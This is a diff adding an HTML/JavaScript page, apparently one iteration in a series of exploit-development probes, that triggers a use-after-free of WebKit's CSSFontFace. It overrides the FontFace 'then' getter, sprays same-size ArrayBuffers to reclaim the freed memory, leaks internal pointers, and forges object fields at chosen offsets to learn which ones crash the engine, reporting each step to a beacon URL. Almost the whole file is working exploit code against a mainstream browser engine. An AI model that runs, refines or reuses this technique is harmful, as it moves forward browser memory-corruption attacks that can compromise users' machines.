@@ -1,0 +1,233 @@
+<!--
+  p576: CSSFontFace UAF diagnostic forge sweep.
+
+  p571 only forged +0x58 (leaving +0x68 = 0, i.e. m_keyCount = 0) so iterateClients
+  never iterated and every test survived. Issue #155 says full forge -> SEGV 15/15,
+  refcount-only -> survive 15/15. The crash comes from SUBSEQUENT engine code that
+  accesses the reclaimed CSSFontFace after the then getter returns.
+
+  This probe identifies which CSSFontFace offsets cause the crash by testing
+  them progressively: safe first, dangerous last. The first crash ends the series;
+  beacons tell us which test was active.
+
+  Pre-churn: warm the 192B bmalloc bucket (V12+ technique).
+  Stage 1: Standard UAF leak (p563-style) to get +0x58/+0x68.
+  Stage 2: Sequential forge tests, each with its own FontFace.
+
+  Tests (safe → dangerous):
+    T0  BASELINE     +0x00=2, rest=0
+    T1  P58_ORIG     +0x00=2, +0x58=leaked (original m_table), rest=0
+    T2  P58_ORIG_KC1 +0x00=2, +0x58=leaked, +0x60=4, +0x64=3, +0x68=1 (force iteration)
+    T3  P58_BAD_KC1  +0x00=2, +0x58=0x41.., +0x60=4, +0x64=3, +0x68=1 (bad table + iteration)
+    T4  OFF_08       +0x00=2, +0x08=0x41.. only
+    T5  OFF_10       +0x00=2, +0x10=0x41.. only
+    T6  OFF_18       +0x00=2, +0x18=0x41.. only
+    T7  FULL         +0x00=2, ALL other offsets = 0x41..
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p576 diagnostic forge sweep</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(v,o){var s='';for(var i=0;i<8;i++){var c=v[o+i];s+=(c<16?'0':'')+c.toString(16);}return s;}
+function grab(v,o){var a=[];for(var i=0;i<8;i++)a.push(v[o+i]);return a;}
+
+function writeQ(v,off,bytes){for(var i=0;i<8;i++)v[off+i]=bytes[i];}
+function writeD(v,off,val){v[off]=val&0xFF;v[off+1]=(val>>8)&0xFF;v[off+2]=(val>>16)&0xFF;v[off+3]=(val>>24)&0xFF;}
+var BAD=[0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41];
+
+var K=8, SIZE=192;
+var leaked={p58:null,p68:null};
+var testIdx=0, testsDone=0;
+var allRetained=[];
+
+var TESTS=[
+  {name:'BASELINE', fn:function(v){writeD(v,0,2);}},
+  {name:'P58_ORIG', fn:function(v,p58){writeD(v,0,2);if(p58)writeQ(v,0x58,p58);}},
+  {name:'P58_ORIG_KC1', fn:function(v,p58){
+    writeD(v,0,2);if(p58)writeQ(v,0x58,p58);
+    writeD(v,0x60,4);writeD(v,0x64,3);writeD(v,0x68,1);writeD(v,0x6C,0);
+  }},
+  {name:'P58_BAD_KC1', fn:function(v,p58){
+    writeD(v,0,2);writeQ(v,0x58,BAD);
+    writeD(v,0x60,4);writeD(v,0x64,3);writeD(v,0x68,1);writeD(v,0x6C,0);
+  }},
+  {name:'OFF_08', fn:function(v){writeD(v,0,2);writeQ(v,0x08,BAD);}},
+  {name:'OFF_10', fn:function(v){writeD(v,0,2);writeQ(v,0x10,BAD);}},
+  {name:'OFF_18', fn:function(v){writeD(v,0,2);writeQ(v,0x18,BAD);}},
+  {name:'FULL', fn:function(v,p58){
+    writeD(v,0,2);
+    for(var off=0x08;off<SIZE;off+=8)writeQ(v,off,BAD);
+  }}
+];
+
+/* ============================================================
+   PRE-CHURN: warm the 192B bmalloc bucket
+   ============================================================ */
+function preChurn(cb){
+  b('P576-PRECHURN');
+  var ds=document.createElement('style');
+  ds.textContent="@font-face{font-family:pcdummy;src:local(Arial);unicode-range:U+0043;}";
+  document.head.appendChild(ds);
+  var df=new FontFace('pcdf','local(Arial)',{unicodeRange:'U+0043'});
+  document.fonts.add(df);
+  void df.loaded;
+  allRetained.push(df);
+  setTimeout(function(){
+    ds.remove();ds.textContent='';
+    try{document.fonts.delete(df);}catch(e){}
+    document.body.offsetHeight;
+    b('P576-PRECHURN-DONE');
+    setTimeout(cb,50);
+  },100);
+}
+
+/* ============================================================
+   STAGE 1: Leak (+0x58/+0x68)
+   ============================================================ */
+function leakPhase(cb){
+  b('P576-LEAK-START');
+
+  var styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:slk;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(styleEl);
+
+  var A=new FontFace('flk','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);void A.loaded;
+  allRetained.push(A);
+
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    styleEl.remove();styleEl.textContent='';
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+
+    window.__lkMap=[];
+    var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+    for(var si=0;si<SIZES.length;si++){
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(SIZES[si]);
+        window.__lkMap.push({size:SIZES[si],view:new Uint8Array(ab)});
+      }
+    }
+    try{document.fonts.check('1em slk');}catch(e){}
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em flk, slk','AB').then(function(){b('P576-LEAK-RESOLVED');},function(){b('P576-LEAK-REJECTED');});
+
+  var scanned=false;
+  function scan(){
+    if(scanned)return;
+    var m=window.__lkMap;if(!m||!m.length)return;
+    for(var i=0;i<m.length;i++){
+      if(m[i].size!==192)continue;
+      var v=m[i].view,nz=0;
+      for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+      if(nz>0){
+        scanned=true;
+        leaked.p58=grab(v,0x58);leaked.p68=grab(v,0x68);
+        var rc=v[0]|(v[1]<<8)|(v[2]<<16)|(v[3]<<24);
+        b('P576-LEAK-HIT-b'+i+'-nz'+nz+'-rc='+rc+'-p58='+hex8(v,0x58)+'-p68='+hex8(v,0x68));
+        setTimeout(cb,100);
+        return;
+      }
+    }
+    for(var i=0;i<m.length;i++){
+      var v=m[i].view,nz=0;
+      for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+      if(nz>0){
+        scanned=true;
+        b('P576-LEAK-WRONGSIZE-b'+i+'-s'+m[i].size+'-nz'+nz);
+        setTimeout(cb,100);
+        return;
+      }
+    }
+  }
+  setTimeout(scan,80);
+  setTimeout(scan,400);
+  setTimeout(function(){if(!scanned){b('P576-LEAK-TIMEOUT');cb();}},2000);
+}
+
+/* ============================================================
+   STAGE 2: Sequential forge tests
+   ============================================================ */
+function runTest(idx){
+  if(idx>=TESTS.length){b('P576-ALL-DONE-'+testsDone+'/'+TESTS.length);return;}
+  testIdx=idx;
+  var t=TESTS[idx];
+  b('P576-T'+idx+'-'+t.name+'-START');
+
+  var famA='fa'+idx, famS='fs'+idx;
+  var se=document.createElement('style');
+  se.textContent="@font-face{font-family:"+famS+";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(se);
+
+  var face=new FontFace(famA,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);void face.loaded;
+  allRetained.push(face);
+
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+
+    se.remove();se.textContent='';
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+
+    window['__tMap'+idx]=[];
+    for(var k=0;k<K;k++){
+      var ab=new ArrayBuffer(SIZE);
+      var v=new Uint8Array(ab);
+      t.fn(v,leaked.p58,leaked.p68);
+      window['__tMap'+idx].push({view:v});
+    }
+    try{document.fonts.check('1em '+famS);}catch(e){}
+    return undefined;
+  },set:function(){}});
+
+  b('P576-T'+idx+'-'+t.name+'-LOAD');
+  document.fonts.load('1em '+famA+', '+famS,'AB').then(
+    function(){b('P576-T'+idx+'-'+t.name+'-RESOLVED');},
+    function(){b('P576-T'+idx+'-'+t.name+'-REJECTED');}
+  );
+
+  setTimeout(function(){
+    b('P576-T'+idx+'-'+t.name+'-SURVIVED');
+    testsDone++;
+
+    var m=window['__tMap'+idx];
+    if(m&&m.length>0){
+      var best=-1,nz=0;
+      for(var i=0;i<m.length;i++){var v=m[i].view,n=0;for(var j=0;j<v.length;j++)if(v[j]!==0)n++;if(n>nz){nz=n;best=i;}}
+      if(best>=0){
+        var v=m[best].view;
+        var rc=v[0]|(v[1]<<8)|(v[2]<<16)|(v[3]<<24);
+        b('P576-T'+idx+'-'+t.name+'-SCAN-b'+best+'-nz'+nz+'-rc='+rc+'-p58='+hex8(v,0x58)+'-p68='+hex8(v,0x68));
+      }else{
+        b('P576-T'+idx+'-'+t.name+'-SCAN-CLEAN');
+      }
+    }
+
+    setTimeout(function(){runTest(idx+1);},300);
+  },800);
+}
+
+/* ============================================================
+   MAIN
+   ============================================================ */
+function main(){
+  b('P576-BOOT-tests='+TESTS.length);
+  preChurn(function(){
+    leakPhase(function(){
+      if(!leaked.p58){b('P576-NOLEAK-ABORT');return;}
+      b('P576-STAGE2-BEGIN');
+      runTest(0);
+    });
+  });
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(main,0);
+else document.addEventListener('DOMContentLoaded',main);
+</script></head><body><p>p576 diagnostic forge sweep</p></body></html>
